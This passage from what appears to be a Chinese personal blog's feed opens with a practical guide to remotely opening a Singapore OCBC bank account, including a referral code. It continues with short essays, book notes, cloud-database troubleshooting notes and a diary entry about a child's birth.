操作，还是比较便捷的。我按照网上的教程走了一遍流程，已经成功开通，简单介绍下踩过的几个坑：</p><p>1）使用 OCBC Digital 这个 APP 就可以完成开通，过程中它会要求你使用手机的 NFC 功能扫描护照芯片信息，<strong>所以你的护照本、身份证要准备好；申请时需要注意，公众人物要填否、是否自雇要填否，另外你的大陆税号就是你的身份证号</strong>。我遇到的两个坑：刚开始税号填的是无，结果一周后审批没通过，审批失败它不会告诉你任何原因，你得自己斟酌；申请通过后还需要做一次 kyc 认证，我认证了十几次才通过，原因是减肥以后长相发生了变化，后来找到一个技巧，拍照的时候手机稍微倾斜可以显得我的脸比较大，更容易通过😅</p><p>2）申请完成后会获得两个账户，一个是新币种账户 SSA，一个是多币种账户 GSA，在半年内入金 1000 新币就可以激活账户；<strong>关于入金，国内的工行、招行等软件上都有跨境汇款入口，可以将你的人民币兑换成新币现汇，然后走跨境汇款转入 OCBC 账户即可，一般一两天可以到账</strong>；我是先通过香港银行转 Wise，然后使用 Wise 转 OCBC 完成的激活，手续费 20 美金，耗时四五天，如果你 Wise 上有钱的话，可以直接走 Wise 新加坡账户的 fast 转账，它是最快的，瞬间到账，还免手续费</p><p>3）SSA 和 GSA 是两个虚拟账户，不会发放实体卡，如果你只是炒美股港股，有这两个账号就可以顺利入金了，但如果要进行线上消费，例如给 Twitter&#x2F;ChatGPT&#x2F;MJ&#x2F;APP Store 等充值，还是需要搞一张具有 CVV、过期时间等信息的卡片；<strong>在 OCBC 的 APP 里头可以开通一个 360 账号，申请完成会获得一张 Visa 虚拟卡</strong>，你可以选择邮寄对应的实体卡，也可以不要实体卡，有没有实体卡唯一的区别应该就是可以在 ATM&#x2F;POS 机上消费吧😄。这里的一个坑是，实体卡和虚拟卡的 CVV 是不一样的，激活了实体卡之后，虚拟卡的 CVV 就作废了</p><p>4）获得了 360 账户的 Visa 虚拟卡以后，就可以绑定 Apple Pay，也可以在苹果商店进行消费了，这里的两个坑是：我在添加 Apple Wallet 的时候一直失败，正确的姿势应该是将手机的地区、时区都切换成新加坡，语言也切换成英文，看起来这应该是苹果自身的限制；另外一个坑是，在 APP Store 真实消费的时候会报错，报错原因应该跟实体卡 CVV 变化有关，我的实体卡还在邮寄的路上，等到了再验证下</p><p>5）OCBC 账户第一年是不需要年费的，一年后，账户低于 1000 新币，每月收取 2 新币的管理费——这比招行香港要便宜，招行香港低于 5000 港币时，每月收 150 港币的管理费——而高于 1000 新币则不收管理费，门槛还是比较低的</p><p>网上看到有人说自己秒开通账户，而我因为首次没有填税号，前前后后申请了两周才成功，看看大家的运气如何吧😄，<strong>OCBC 的开户有一个推荐码 IER9FDOS，使用的话，你我都会获得 15 新币的奖励，这个是可选项，随意就好。</strong></p><p>关于开通细节，相关讨论的帖子在 <a href="https://twitter.com/Barret_China/status/1699076946053996751">这里</a>。</p><h3 id="申请一段时间后的一个踩坑"><a href="#申请一段时间后的一个踩坑" class="headerlink" title="申请一段时间后的一个踩坑"></a>申请一段时间后的一个踩坑</h3><p>新加坡华侨银行 OCBC 的安全校验做的实在是太严格了，<strong>密码输错三次，直接账户限制登录，OneToken 限制使用</strong>。解除登录限制需要给新加坡客服打电话，会有人工询问一堆账户相关信息，包括卡号、账户数量、护照、余额等，确认后可以重新登陆，但依然无法使用 OneToken，也就是无法添加收款人，无法完成转账，不影响收款。OneToken 的激活方式是一个 6 位数的激活码，它竟然要通过邮寄的方式寄过来😂，之前的首次激活是短信认证的，难怪有读者留言说，换手机时要谨慎，原来重新激活 OneToken 这么麻烦……</p><blockquote><p>网友提醒：“可以打客服，让他们发到app里的安全邮箱里面。邮寄信件就不用等了”，我电话确认了下，支持两天后给我的安全邮箱发送激活码，但是需要继续打电话过去，当场操作。另外，原来安全邮箱不是我的 Email，而是手机软件里头的「安全邮箱」。<br>OCBC 银行的客服在早上九点之前只有英文客服，第一次用英语连续交谈超过十分钟，过程中不停确认对方说的话。我又多了一个足够的动力好好练英语了🥲</p></blockquote><p>另外一个小提醒，跨国信件一定要在地址栏中把手机号码给带上，他们发出来的信件可能不包含手机号码栏，而地址写的要么是英文，要么是拼音，快递小哥很容易看迷糊然后送丢😂</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>在发布到社交媒体的时候，有网友指出，我说的不太对，正确的信息是：</p><blockquote><p>国外人开通 Statement Savings Account (SSA) 默认第一年账户管理费免除，一年后如果余额达不到S$20,000，手续费为S$10&#x2F;月。可以只保留 360 account，最低结余3000即可，否则手续费S$2&#x2F;月。SSA账户6个月无余额自动关掉。 </p></blockquote><p>大家在开通之前，也可以再去阅读一下官方<a href="https://ocbc.com/iwov-resources/sg/ocbc/personal/pdf/help-and-support/general/personal-banking-pricing-guide.pdf">文档</a>，管理费是比较值得关注的一个问题。按照网友的提醒，SSA 和 GSA 都是可以考虑关闭的，最后只保留 360 账户，这样卡里头放 3000 新币就可以免手续费了，即便低于这个门槛，一个月 2 新币的管理，个人也是可以接受的。</p><p><strong>Q: 想问一下那个手机NFC扫描护照，一直没有扫描成功是什么原因</strong></p><p>找准姿势，芯片应该在护照偏上方的位置，放着不要动，等那几个点都变绿色就成功了，我也试了好几次。貌似有些手机型号 NFC 就是有问题的，具体型号不知，我的是 iPhone 14 pro Max，正常。如果一直失败，需要确认下，你的护照芯片是不是损坏了，或者过期了😂</p><p><strong>Q: 看了一下 是申请成功后要转入1000美元</strong></p><p>是 1000 新币，不是美金，美金单位是 <code>$</code>，新币是 <code>S$</code>，不要看错了。</p><p><strong>Q: 抱歉暂时无法处理您的请求</strong></p><p>换一个时机，再重新尝试下吧，不能处理你的请求，不一定是你的问题，也可能是银行自身服务的问题，还有可能是申请的人有点多导致的，银行可不会告诉你具体原因。</p><blockquote><p>网友回复：换个时间，我失败了几十次，过了几天一次过</p></blockquote><p><strong>Q: 税号是什么？</strong></p><p>税号就是你作为纳税人的编号，你可能拥有多个税号，例如在中国，你的税号是身份证，在香港工作，你的税号是护照或者香港身份证，在美国工作，你的税号是 SSN&#x2F;ITIN。个人有税号，企业也会有税号。在申请的时候填大陆身份证就行了，填多了没啥好处。</p><p><strong>Q: 你每次转账都给20刀手续费吗</strong></p><p>如果你有其他新加坡账户，或者开通了 Wise，可以使用 Fast 转账，这是新加坡国内账户间转账最快的方式，一般情况都是免费的。花 20 刀、100 多港币等基本都是 Global Swift 转账，跨境收取手续费比较高。</p><p><strong>Q: 一般都是国内卡转出去阿  wise 是否能绑国卡或港卡后免费转账呢</strong></p><p>Wise 不存在绑卡，但是可以申请 Wise Debit Card，目前还没有大陆和香港的储蓄卡可以申请，因此无论是向 Wise 转账，还是向新加坡银行转账，都只能走跨境转账，手续费应该免不了。你也可以尝试下使用<a href="https://p.pandaremit.com/h5activity/launchInvitationCode?countryCode=CHN&shareCode=NEVQNFhO&lang=zh-hans">熊猫速汇</a>，跨境转账手续费要低不少，比较靠谱。</p><p>最后，温馨提示，<strong>使用 OCBC 邀请码 IER9FDOS，可获得 15 新币的奖励哦</strong>，银行卡办理过程中如遇到了问题，可在文章底部留言，我会定期过来解答。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 数字游民 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>还写博客么？</title>
      <link href="/blog/2023/06/26/blog-writer/"/>
      <url>/blog/2023/06/26/blog-writer/</url>
      
        <content type="html"><![CDATA[<p>随着云计算和人工智能的发展，Web 3.0 悄然来袭，没有哪个标志性的事件宣布 Web 2.0 走进了尾声，但可以这么说，在发展不均衡的时代背景下，Web 2.0 很长一段时间都不会消失，它只不过不再是这个时代的主角了。</p><p>本博客从 2013 年开始，基本上 <a href="/blog/archives/">每年</a> 都会输出一点东西，就这么写着写着，写了十年，最近两年在推特上活跃多一些，长内容就写的很少了。还写博客么？我最近也在思考这个问题。</p><p>十年前，刚走进职场，构建个人影响力可以说是写博客的最大动力，学习-分享-交流-再学习，按照这个模式走了多年，也让我养成了热爱分享的习惯。过去的表达大多带有功利心，希望文章能够有更多曝光，获得更多影响力；也带有虚荣心，希望文章有更多人点赞、转发，获得他人的认可。随着职场逐渐成熟，这种功利心和虚荣心的表达逐渐减少——当然，不可能完全没有——很多东西写了，都是给自己看的，开始把写作当成了一种记忆转存的手段。</p><p>在技术学习阶段，我对自己的写作提出了一个基本要求，那就是写搜索引擎没有的东西，如果搜索引擎有，那我就写最全的内容，否则写作就没有太多的价值，互联网从来不缺一篇重复的水文。后来自己获取信息的能力变强了，发现几乎所有的问题，互联网都给出了答案，写作的动力持续在减退。最近一年多，ChatGPT 横空出世，别说技术问题，就连生活上的问题，找它问上几句，它都可以清清楚楚、明明白白地把内容写的特别好，因此写作的动力又下降了一波。</p><p>在这个被短视频主导的信息时代，文字的力量显得越来越弱，可我始终相信文字的生命力。在 2019 年我就卸载了短视频软件，后来微博、微信、Twitter 又陆续搞了短视频，每次点进去就会消耗半个多小时，可看完关闭屏幕，再去回味，却好像啥也没看；约莫在 2020 年我卸载了所有社交媒体软件，微信也关闭了消息通知能力，手机的使用时长从每天 6+ 小时，缓慢降低到 1+ 小时。这个变化带来的影响一定是有正面价值的，我把多出来的时间都放到了读书和陪伴家人上，当然啦，也干了很多其他无意义的事情。</p><p>那还写博客么？似乎这个问题也不是那么重要。如果为了记录而记录，那记录这件事情也变得没有价值了。人的一生都在跟空虚和无聊对抗，写作不外乎也是其中一种。</p><p>此刻的写作就是为了记录。<br>记录自己心理的变化，记录生活的变化，记录工作的心得，记录我对这个世界认知的变化。<br>如果在记录的过程中可以带来外在的声量，获得一些有趣或无趣的反馈，那都是一件值得庆幸的事情。</p><p>完）</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记《当呼吸化为空气》</title>
      <link href="/blog/2022/09/18/gvnty0/"/>
      <url>/blog/2022/09/18/gvnty0/</url>
      
        <content type="html"><![CDATA[<p>作者：保罗·卡拉尼什<br><img src="/../blogimgs/2022/09/18/1663503657876-671e3d78-9256-41b4-a7c3-028a9e157359.png" alt="image"><br>保罗一生都在追寻生命的意义。</p><p>“I can’t go on, I’ll go on”，看到最后才明白，我无法前行——没有办法继续从事热衷的事业；我仍将前行——因为还活着，还在追寻生命的意义，弃（转）医从文可以帮助我继续前行。</p><p>到底是什么让人类的生命充满意义？保罗说，“要么去研究生命的意义，要么就去亲自经历和体验生命的意义。”</p><p>东边已是青天白日，阳光扑面而来，西边的黑夜却毫无屈服之意。黑夜与白天的分界，这景象如此崇高伟大，大概也没有哲学家能很好地用言语来解释。每当此时，就仿佛上帝在说：“要有光！”在高山、大地、宇宙这无限的辽远广阔之中，你情不自禁地觉得自己是渺小的一粒微尘，然而还是能感觉自己的双脚踩在大地上，确信自己存在于这庄严宏伟的天地之间。<br>在浩瀚的宇宙面前，人从来都是渺小的，不及一粒尘埃。但是从内心去看自己，又是那么的强大而包容，大到可以容纳整个宇宙。</p><p>我选择医疗事业，部分原因是想追寻死神：抓住他，掀开他神秘的斗篷，与他坚定地四目相对。神经外科对我的吸引力，不仅仅在于大脑与意识的交缠，更在于生与死的纠葛。我以为，在生与死的空间中，我一定能找到一个舞台，不仅能凭怜悯和同情来采取行动，自身还能得到升华，尽可能地远离所谓的物质追求，远离自我那些微不足道的小事，直达生命的核心，直面生死的抉择与挣扎……<br>在医院，保罗每天都在跟命悬一线的病人打交道，死神为生命开启了一场拉锯赛，保罗在这场赛事中，在无数次生与死的较量之中，从参与者到亲历者，从未停止战斗，甚至一度转换自己的角色，转医从文，继续抒写生命的意义。<br>我意识到，在给病人的脑部做手术之前，我必须首先了解他的思想：他的个性，他的价值观，他为了什么活着，要遭遇什么样的灾难，才能合理地终止这条生命。我是如此渴望成功，也为此付出了很大的代价，有些无法避免的失败让我感到几乎无法承受的负疚感。正是这些包袱，让行医变得神圣而完全无法想象：背负起别人的十字架，你总有时候会被重负压垮。</p><p>“别因为你要死了才去做或者不去做某件事情，而是要找到自己认为重要的事情，不管什么时候，只要去做”，当死亡驾临之时，已经没有了内心的束缚，眼前所看到的一切都已发生变化，也正是哪个时候的自己，才是凭着自己的内心过活，拿捏得清楚什么是最重要的事情。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务使用过程的问题小记</title>
      <link href="/blog/2022/08/05/bicgb6/"/>
      <url>/blog/2022/08/05/bicgb6/</url>
      
        <content type="html"><![CDATA[<p>记录最近使用基础云设施的过程中遇到的几个有意思的问题：</p><p><strong>1、OceanBase 数据库锁问题</strong><br>给业务数据模型扩充了一个远程方法调用，利用 ORM 的 hooks 特性加到了 afterCreate 中，导致偶发数据库锁。原因是业务存在事务处理批量调用，新增的 RPC 操作让事务整体时长变得十分漫长，过程中出现了对同一实体的操作被锁。</p><p><strong>2、RocketMQ 消息不消费产生堆积</strong><br>开发环境和测试环境复用了同一个 MQ 消息 Group，为了区分不同的环境，消息在提交和消费的时候都增加了 env Tag，结果在消费的时候，始终丢消息。原因是同一个 Group 对应的 Consumer，其 Topic 和 Tag 必须保持完全一致，否则会因为 RocketMQ 储存模型和消息拉取模型的设计问题导致消息消费不了。</p><p><strong>3、MongoDB CPU 暴涨</strong><br>为了查询更快，给一张表增加了复合索引，突然在某段时间，MongoDB 的 CPU 上涨，飙高到 100%。原因是表体积增长过快，插入一条数据时，需要完成大量的索引更新，每次更新耗时会超过 100ms，服务器不堪重负，最终导致吞吐量变成零。</p><p>业务规模扩大之后，类似的云服务使用问题会出现的越来越频繁，也正因如此，事情变得越来越有意思了。感知这些问题，需要对服务的使用和原理有比较全面的了解，同时也需要掌握相应的工具和方法，把核心问题的监控做到位，才有可能避免线上故障。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孩子出生第一天的一些点滴</title>
      <link href="/blog/2022/08/05/dzrya3/"/>
      <url>/blog/2022/08/05/dzrya3/</url>
      
        <content type="html"><![CDATA[<p>今天是个特别的日子，家中又迎来了一位小公主，生第一胎的时候，懵懵懂懂，啥也不会，孩子哭了，就等着月嫂过来照顾，看着学着，也没摸出多少门道，等月嫂走了，连忙又签约了一名家庭医生，闲暇之余，就是各种阅读育儿说明书，忙起来的时候也是一地鸡毛。<br><img src="/../blogimgs/2022/08/05/1659686204403-d9b72546-5b51-4bc0-94c6-69a2888c8b09.jpeg" alt="image"></p><p>二娃多多少少有了一点经验，依稀还记得四年前，也是在手术室前，焦急地等着，担心孩子，担心老婆，担心自己的身份即将发生变化。今天早上守在手术室前，些许的紧张自然也是免不了的，不过想到现代医学之成熟，时间流失也快了不少，在等待的那一个多小时里，屁股竟没有离开过板凳。很快，就看到医生推着老婆和娃出来了。</p><p>孩子离开母体，来到这个世界，感受最多的是孤独和陌生，而表达这种情绪的唯一方式就是哭闹。在病房，四处皆是孩子啼哭之声，一天二十四个小时，从未停歇。第一胎的时候，完全听不得孩子哭，稍有响动，便会跑过去，拍一拍，安抚安抚，若安抚不好，还会抱起来摇一摇、哼一哼，让她感受到自己在被关怀。</p><p>刚出生的孩子，会被医生抓出来做各项检查，直到离开产房进入病房，在这段时间里，孩子的体温会有所下降。因此，新生儿回到病房的第一个小时，就是贴着母亲的身体，取暖，这也是一剂赶走孤独感的良药。看着此刻的娃，整蜷缩在母亲的怀里，大人悬着的心也塞回去了一大半。</p><p>新手爸妈最担心的不是孩子哭闹，而是面对孩子的哭闹，不知所措。刚出生一天的孩子，胃容量只有 6~8ml，在奶嘴边嘬两下，肚子就会鼓鼓的了，但这对于还没有开奶的妈妈来说，却是一件让人头疼的事情，孩子半天嘬不出奶，刹那间，便闷红着小脸，皱眯着双眼，张大嘴巴，哭喊起来，偶尔还能看到眼角噙着泪水，甚是惹人怜爱。</p><p>刚出生孩子的吮吸是条件反射，她以为自己还游荡在母体内，咕噜咕噜地，羊水一口一口进肚子，无论饿不饿，吮吸是不会停的，所以也会看到，孩子在无聊之时，抓到什么便吮吸什么，实在没啥可抓，就把自己的小手指头塞进嘴里，嘬得正经有味。</p><p>孩子每隔两个多小时，就要准时吃上两口，标准时长是十五分钟，能把奶嘬出来那是最好，若嘬不出来，接下来便是声嘶力竭、雷霆怒啸。还记得一胎刚出生的当天夜里，因为嘬不出初奶，转身就成为了整个楼层的啼哭比赛冠军，搞得护士不得不整点其他奶给孩子止止馋。</p><p>以前在新生儿身上听的最多的是黄疸，直到今天才正儿八经搞明白它是个啥，孩子刚出生，代谢很快，红细胞在代谢过程中会产生胆红素，而新生儿的肾脏还没有发育完全，对胆红素的处理能力不足，因此会看到孩子皮肤开始泛黄，怎么办呢，其实很简单，多吃多拉。说起来是简单，做起来就需要靠妈妈和孩子的良好配合了，奶要备足，而且孩子要准时喝、顺利拉，需要细致的照顾。</p><p>所以呀，养孩子，就是这么点事儿，吃、喝、拉、撒。<br>今晚肯定是个不眠夜，😄</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记《乌合之众》</title>
      <link href="/blog/2022/07/27/wp7gyn/"/>
      <url>/blog/2022/07/27/wp7gyn/</url>
      
        <content type="html"><![CDATA[<p>作者：[法] 古斯塔夫·勒庞<br><img src="/../blogimgs/2022/07/27/1658853646152-34d95ec6-229e-4620-a8d1-12cc576107d6.jpeg" alt="image"><br>一本几万字的心理学著作，两个小时读完了。读的太快，好多内容没有消化完，又花了大概半个小时去回味自己感兴趣的部分。</p><p>作者把群体当做一个特定的研究对象，如同研究一个具体的人一般，去分析这个对象的性格、行为和特征，通过对历史事件的解读，持续论证自己抽象和归纳的内容。例如群体是如何获得思想的，先从思想的特征开始，将思想概况为两类，一类是瞬间的内容，一种是稳定性很强的内容，“对群众灌输任何思想，器表现形式必须是很绝对、很强硬、很直白，不然就不起作用。所以任何思想都必须化装成形象，才能传递给民众。”，思想会变成一种情感，最后深入人心。</p><p>作者的文风十分跳脱，即便是重新跑回去回味，也没有抓住作者对大众心理进行分析的基本逻辑和推演过程，反正就是看着看着，作者就会突然冒出一个结论，即便是把之前写的几页铺垫再读个两三遍，也无法得知这个结论的推理过程是怎样的。这或许跟作者所说是自洽的，“对于渴望理想的心灵来说，科学是不够的，因为科学不敢承诺太多，因为它不会撒谎。”</p><p>这本书也是通过迎合乌合之众的方式，把读者带进了“群体”之中，让读者学会用群体的思维来思考。还是值得再精读一遍的。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回味是苦药</title>
      <link href="/blog/2022/07/27/dw6f2k/"/>
      <url>/blog/2022/07/27/dw6f2k/</url>
      
        <content type="html"><![CDATA[<p>有什么法子可以快速从一段失败的恋爱中走出来？有人说，是马上进入到下一段。</p><p>回味是苦药，在过去停留的越久，脑子里就不会有多余的空间去思考未来的事情，我们的思考也是有带宽的。同样的道理，每天都会遇到各种让人不愉快的事情——这取决于心情，这些糟心事如果不能快速从眼前消失，那么注定就会迎来痛苦的一天。</p><p>我从一位脊椎受伤下半身瘫痪的残疾人身上学到两点：</p><ol><li>每天遇到最多的事情就是从椅子上摔落，如果沉浸在摔落的疼痛和与过去健全自己的对比之中，那么这一天就废了，如果一直这样，那这一辈子都废了</li><li>坐着轮椅参加了七次马拉松，走在路上，都会跟人喊一声“麻烦让一让路”，腿最大的作用还是行走，当轮椅上的自己“行走”速度已经超过了大多数人，那就不用再纠结残疾的问题了</li></ol><p>无论是悲伤还是喜悦，这种情绪就像麻醉剂一样，让人停滞不前。收拾收拾心情，马上投入到下一件事情之中，才能尝到苦药的甘甜。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不活成他人眼中的自己</title>
      <link href="/blog/2022/07/26/knaauu/"/>
      <url>/blog/2022/07/26/knaauu/</url>
      
        <content type="html"><![CDATA[<p>听一个分享，有一段内容比较有意思：<br>What people say about you and what people think about you, it comes from their view of the world, It’s from their opinions and their values and their experiences. Maybe they having a bad day, or they’re very insecure or unhappy. It has nothing to do with you. And the way other people treat you is not reflection of who you are, it’s reflection of who they are. So now when someone says somethings hurtful to me, it still hurts, but not as much, because i know it probably has nothing to do with me.</p><p>有的时候，人们就是太在意别人的评价，因此不敢表达，不敢做真实的自己。别人的话重要么？毫无疑问也是重要的，尤其是在离开父母和学校以后，不会再有人对自己做过多的评价，一旦感知不到自己的全貌——好的和不好的点，也就无法快速识别和改进自身的问题。</p><p>别人对自己的评价，反应出来的不一定是真实的自己，因为每个人看待这个世界的方式受到他此刻的心情、认知和经验的影响，如果对自己没有深刻的认知，就很容易误认为自己就是别人眼中的自己，要知道，活成他人眼中的自己很累，也永远都活不好。</p><p>别人说的话或许也不重要，但自己对别人说的话所做出的反应，一定是重要的，所有的反应都是最真实的自己。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东风不来</title>
      <link href="/blog/2022/06/30/dpltzy/"/>
      <url>/blog/2022/06/30/dpltzy/</url>
      
        <content type="html"><![CDATA[<p>万事俱备，只欠东风，但东风往往就是不来。<br>不能总想着把所有的准备工作全部做好再把脚踏出去，身体不往前倾，就永远不会有迈开腿的念想。<br><a href="https://www.yuque.com/barretlee/chat/osocih">事情太难，往往是心里觉得它难</a>。都没有去践行，甚至没有去思考如何破解难题，如何就知道这一步踏不出去呢？退一步想，即便行差踏错，也就是损失些时间罢了，有太多重头再来的机会。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>行左右之事</title>
      <link href="/blog/2022/06/30/fi1zpe/"/>
      <url>/blog/2022/06/30/fi1zpe/</url>
      
        <content type="html"><![CDATA[<p>能左右之事，寥寥无几，能投入的时间，亦是极其有限；缩小关注的圈子，才有机会让聚焦的事情占据更多的时间；保持好奇心，但也别让好奇心把自己带进了迷宫；时间是最大的成本，放平心态，戴上耳机，暂时性地忘记一切，迈好眼前的步子。 </p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>核酸数据通大难题</title>
      <link href="/blog/2022/06/05/grgoas/"/>
      <url>/blog/2022/06/05/grgoas/</url>
      
        <content type="html"><![CDATA[<p>在湖南做了核酸，只有湖南的健康卡能看到核酸记录，浙江的看不到，原因好像是湖南做的没有上传到国家平台。<br>数据通还真是一个国家难题。打了一个多小时的电话，联系了八个部门和单位，有几个结论：</p><ol><li>省级数据需要上传到国家平台，数据才能互通</li><li>湖南核酸平台的数据跟国家平台不通，但好像又能通，这里有细节技术问题，但找不到具体接口人，没有明确的信息告知哪里做核酸数据一定能通</li><li>疾控中心现在只关心红黄码问题，不关注核酸检测报告问题，公共卫生系统和各级疫情防控部门都不关注，上级部门不了解下级部门的执行细节，下级部门不处理涉及上级部门的问题，所以如果是下级部门用到了上级部门的系统，并且出了问题，就会发生死锁</li><li>省级和市级对区级的核酸检测没有做任何数据上报的规范，在湖南就统一用湖南健康卡流通数据，流通范围也只在湖南，之所以不用身份证是担心个人信息泄露</li></ol><p>生在这个问题很多同时也意味着机遇很多的时代，只能寄希望于国家政府部门能做的更好了。另外，市长热线好评，问的很详细，记录的也很全面，希望能够推动问题的解决。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一切都是最好的安排</title>
      <link href="/blog/2022/06/02/uph8bv/"/>
      <url>/blog/2022/06/02/uph8bv/</url>
      
        <content type="html"><![CDATA[<p>端午回老家，五点起床，飞机转高铁，也算是够折腾的，本以为飞机会晚点，没料想非常准时。可千算万算没算到最后单程仅两刻钟的高铁竟然晚点两个小时，耽误了回家吃午饭。更悲催的是，看到火车晚点后，立马又改签到另外一班，结果晚点时间变得更长。瞬间就有了一种出门踩到狗屎的无奈。</p><p>外头的天气也是见鬼一般跟人做对，一场雨在头顶上迟疑了大半个上午，要下不下，高铁站内摩肩擦踵，整个人汗涔涔的，仿佛跟闷热的空气粘在了一起，甚是焦躁。</p><p>在麦当劳找了一个角落坐了下来，打开音乐，挂上耳机，木讷地注视着前方。恍惚中看到，坐在隔壁的小孩在喧闹，一对中年夫妇对视着交谈，女孩举着手机在看小说……叮铃铃，孩子妈妈的手机响了，恍惚中听到一句：“火车晚点了，一个小时，正好，中午在火车站吃个午饭”。</p><p><strong>是的，正好</strong>。火车正好晚点了，我正好坐在这里，正好看到了眼前的一切，正好我可以回去赶晚饭了，正好在百忙之中回一趟家……</p><p>那，我刚才在焦躁什么？是因为晚点的高铁让我滞留在火车站么？是因为人潮汹涌的火车站让我感到窒息么？不知道是不是想通了些什么，那种感觉不见了。</p><p>诚然，火车的晚点是我无法控制的，就好像疫情也无法阻止大家回家过节一样，我能做的就是放平心态，去感受此刻自己的内心。想一想，我在哪里，我在做什么，我将要去往何方。或许我们所遭遇的一切都是最好的安排。</p><p>点了一杯冰镇的饮料，一口下去，心也凉快了。</p><p>2022年06月02日22:18:04</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平静、智慧和勇气</title>
      <link href="/blog/2022/05/30/qnvohn/"/>
      <url>/blog/2022/05/30/qnvohn/</url>
      
        <content type="html"><![CDATA[<p>朋友准备离开杭州，一起吃饭，畅聊了四个多小时。</p><p>生活都会驱使我们去追求很多东西，“放下”二字说起来是轻松的，但真的去放下时，又变得百般困难。所以我们需要有足够的智慧，去看清楚哪些是自己能够改变的，哪些是不能被自己所左右的。</p><p>掰着手指头盘下来，自己能改变的最多的便是自己——心理、态度、行为、性格、习惯，改变一二，就会影响我们看待这个世界的方式。最无奈的是，无数次看到自己的问题，却没有勇气去改变它。</p><p>想起来了尼布尔说的那句祷告词：<br>上帝，请赐予我平静，去接受我无法改变的；给予我勇气，去改变我能改变的；赐我智慧，分辨这两者的区别。</p><p>那些难以撼动的，可以去感受它、理解它，平静地对待他。内观自己，看清楚哪些是情绪的波动，哪些是真正驱动自己的东西。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>放下身段，变成孩子</title>
      <link href="/blog/2022/05/27/dnqqcs/"/>
      <url>/blog/2022/05/27/dnqqcs/</url>
      
        <content type="html"><![CDATA[<p>今天跟同事讨论养孩子，他家的十来岁，我家的四岁。我说四岁的孩子调皮捣蛋，干啥都不专注，得像个办法治一治，不然长大了就治不了了。</p><p>最后讨论下来，问题的根源还是在家长，想让孩子专注，首先自己得有耐心，自己能保持专注。放下大人的身段，以一个孩子的心态跟她一起玩、一起学。心里的认知需要先跟上，以前总想着用最经济、最省事的方式陪孩子，结果适得其反。</p><p>如果想让孩子喜欢上一件事情，就需要让她感受到喜欢这件事情带来的乐趣，最起码要让孩子感觉家长对这件事情也是有兴趣的。我期望孩子能够爱上阅读。</p><p>让孩子爱上阅读有一个天大的好处，她未来会把自己大把的时间都泡在书里，爱上梦幻的王国和丛林的松鼠，爱上书里的人和事。读书的时间多了，玩手机的时间也就少了，上房揭瓦的时间也会变少。我只需要在她四岁的时候花一到三年时间带她找到读书的乐趣，就有机会在未来十年收获一只有书香的闺女，这笔时间投资想想都不亏。</p><p>接下来，我打算多购买一些“无用”的儿童书籍，各式各样的，跟她一起学习，这件事情可以先做三年。“有用”的书我已经不打算买了，孩子越学越抵制。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>是权利，也有义务</title>
      <link href="/blog/2022/05/26/smroy4/"/>
      <url>/blog/2022/05/26/smroy4/</url>
      
